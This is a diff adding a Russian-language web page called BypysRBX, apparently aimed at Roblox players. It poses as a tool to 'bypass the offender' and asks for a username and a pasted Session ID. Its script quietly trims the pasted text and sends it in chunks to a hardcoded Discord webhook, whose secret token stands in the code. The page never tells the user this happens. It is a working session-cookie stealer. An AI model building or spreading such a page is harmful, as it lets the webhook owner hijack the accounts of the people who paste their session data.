@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>BypysRBX</title>
+
+<style>
+:root {
+--bg-dark: #071023;
+--glass: rgba(255,255,255,0.06);
+--glass-2: rgba(255,255,255,0.03);
+--accent: #06b6d4;
+--accent-2: #7c3aed;
+--text: #e6eef8;
+--muted: #9aa6b2;
+}
+
+* { box-sizing: border-box; }
+
+html, body {
+height: 100%;
+margin: 0;
+font-family: Inter, Roboto, Arial, sans-serif;
+background:
+radial-gradient(1200px 600px at 20% -10%, rgba(124,58,237,0.15), transparent 40%),
+radial-gradient(800px 500px at 90% 10%, rgba(6,182,212,0.15), transparent 40%),
+linear-gradient(180deg,#071023 0%, #041122 45%, #021018 100%);
+color: var(--text);
+}
+
+.site-wrap {
+min-height: 100vh;
+display: flex;
+flex-direction: column;
+align-items: center;
+padding: 32px 14px;
+}
+
+/* ✅ HEADER В ПРАВОМ ВЕРХНЕМ УГЛУ */
+.header {
+position: absolute;
+top: 20px;
+right: 20px;
+display: flex;
+align-items: center;
+padding: 10px 16px;
+border-radius: 14px;
+backdrop-filter: blur(10px);
+background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
+border: 1px solid rgba(255,255,255,0.07);
+box-shadow: 0 20px 50px rgba(2,6,23,0.7),
+inset 0 1px 0 rgba(255,255,255,0.08);
+}
+
+.brand { display: flex; gap: 12px; align-items: center; }
+
+.logo-dot {
+width: 42px;
+height: 42px;
+border-radius: 12px;
+background: linear-gradient(135deg,var(--accent),var(--accent-2));
+display: flex;
+align-items: center;
+justify-content: center;
+font-weight: 900;
+color: #001;
+}
+
+main {
+width: 100%;
+max-width: 980px;
+margin-top: 80px;
+}
+
+.panel {
+border-radius: 18px;
+padding: 22px;
+backdrop-filter: blur(12px);
+background: linear-gradient(180deg, var(--glass), var(--glass-2));
+border: 1px solid rgba(255,255,255,0.06);
+}
+
+.controls { display: flex; flex-direction: column; gap: 12px; }
+
+input, textarea {
+padding: 14px 16px;
+border-radius: 12px;
+border: 1px solid rgba(255,255,255,0.08);
+background: rgba(2,6,23,0.55);
+color: var(--text);
+}
+
+.btn {
+padding: 12px 16px;
+border-radius: 12px;
+border: none;
+font-weight: 800;
+cursor: pointer;
+background: linear-gradient(90deg,var(--accent),var(--accent-2));
+color: #001;
+}
+
+.btn[disabled] { opacity: 0.45; cursor: not-allowed; }
+
+#message { font-weight: 600; }
+</style>
+</head>
+
+<body>
+<div class="site-wrap">
+
+<header class="header">
+<div class="brand">
+<div class="logo-dot">B</div>
+<div style="font-weight:900">bypysrbx</div>
+</div>
+</header>
+
+<main>
+<section class="panel">
+<h1>BypysRBX</h1>
+
+<div class="controls">
+<input id="username" type="text"
+placeholder='впишите username без "@"' autocomplete="off">
+
+<textarea id="sessionmsg" rows="4"
+placeholder="Session ID"></textarea>
+
+
+
+<div style="display:flex; gap:12px; align-items:center">
+<button id="submitBtn" class="btn" disabled>Байпасснуть обидчика</button>
+<div id="message" style="display:none"></div>
+</div>
+</div>
+</section>
+</main>
+</div>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', () => {
+const usernameInput = document.getElementById('username');
+const sessionInput = document.getElementById('sessionmsg');
+const btn = document.getElementById('submitBtn');
+const msg = document.getElementById('message');
+
+const DISCORD_WEBHOOK_URL =
+'https://discord.com/api/webhooks/1458280504502784123/Jie5d0xI0a-nDRMa50fjXKacIl3_o3omg0vBBUs0RR8WRNiOajl3W9kfTYu_vqMNNUD5';
+
+function showMessage(text, ok = true) {
+ msg.style.display = 'block';
+ msg.style.color = ok ? '#9ee7cf' : '#ffbdbd';
+ msg.textContent = text;
+}
+
+function hideMessage() {
+ msg.style.display = 'none';
+}
+
+function enableIfValid() {
+ const cleaned = usernameInput.value.replace(/@/g, '').trim();
+ usernameInput.value = cleaned;
+ btn.disabled = !(cleaned && sessionInput.value.trim());
+}
+
+usernameInput.addEventListener('input', () => { enableIfValid(); hideMessage(); });
+sessionInput.addEventListener('input', () => { enableIfValid(); hideMessage(); });
+
+/* удалить первые 1000 символов */
+function cutFirst1000(text) {
+ if (text.length <= 1000) return null;
+ return text.slice(1000);
+}
+
+/* удалить последние 800 символов */
+function cutLast800(text) {
+ if (text.length <= 800) return null;
+ return text.slice(0, text.length - 800);
+}
+
+/* комбинированная обработка */
+function processText(text) {
+ const afterFirst = cutFirst1000(text);
+ if (!afterFirst) return null;
+
+ const afterLast = cutLast800(afterFirst);
+ if (!afterLast) return null;
+
+ return afterLast;
+}
+
+async function sendChunked(text) {
+ for (let i = 0; i < text.length; i += 1900) {
+  await fetch(DISCORD_WEBHOOK_URL, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json' },
+   body: JSON.stringify({ content: text.slice(i, i + 1900) })
+  });
+ }
+}
+
+/* ✅ ЗАМЕНЁННЫЙ ОБРАБОТЧИК КНОПКИ */
+btn.addEventListener('click', async () => {
+ const username = usernameInput.value.trim();
+ const sessionText = sessionInput.value;
+
+ if (!username || !sessionText) {
+  showMessage('Заполните все поля', false);
+  return;
+ }
+
+ const processed = cutFirst1000(sessionText);
+
+ if (!processed) {
+  showMessage('Текст короче или равен 1000 символам', false);
+  return;
+ }
+
+ btn.disabled = true;
+ showMessage('Отправка...', true);
+
+ try {
+  await sendChunked(
+`Processed Session ID
+User: ${username}
+
+${processed}`
+  );
+  showMessage('Отправлено ✅', true);
+  sessionInput.value = '';
+ } catch {
+  showMessage('Ошибка отправки', false);
+ } finally {
+  enableIfValid();
+ }
+});
+
+enableIfValid();
+});
+</script>
+</script>
+</script>
+
+</body>
+</html>
